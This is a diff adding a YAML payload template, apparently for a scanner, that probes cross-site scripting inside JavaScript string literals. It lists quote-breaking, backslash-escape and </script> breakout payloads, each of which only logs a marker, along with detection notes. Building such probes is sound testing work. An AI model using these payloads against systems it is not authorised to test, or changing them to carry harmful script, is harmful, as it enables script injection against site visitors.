@@ -1,0 +1,35 @@
+# Inside a script string literal, where the quote is the only delimiter that
+# matters and HTML encoding is no defence at all. The marker is computed or
+# unique, never a literal the request also carries.
+id: xss/jsstr
+title: Script string literal escapes
+reviewed: "2026-08-31"
+variables: [MARKER]
+safety: >-
+  Every entry is written to leave the surrounding block parsable. An unbalanced
+  payload breaks the page's own script for whoever loads it, which is a change
+  to the application rather than an observation of it.
+entries:
+  - name: close and continue, double-quoted
+    payload: "\";console.log('{{MARKER}}');//"
+    detect: "The comment absorbs the remainder of the original statement so the block still parses. A parse failure executes nothing and reads as a negative."
+
+  - name: close and continue, single-quoted
+    payload: "';console.log('{{MARKER}}');//"
+    detect: "Same shape for a single-quoted literal."
+
+  - name: escape-aware form
+    payload: "\\\";console.log('{{MARKER}}');//"
+    detect: "Where the template escapes the quote by prefixing a backslash, escaping the backslash instead restores the quote's meaning."
+
+  - name: break out of the script element
+    payload: "</script><img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "The parser ends the element on the literal text regardless of the JavaScript around it, so this works where quote escaping holds."
+
+  - name: computed marker
+    payload: "\";console.log(1337*7);//"
+    detect: "Returns 9359 only if the block evaluated it. Separates evaluation from a template that reflected the payload's text."
+
+  - name: encoder control
+    payload: "{{MARKER}}<>&"
+    detect: "Read the raw body: HTML entities here mean an HTML encoder ran on a JavaScript context, which is the mistake that leaves the quote live and the brackets dead."
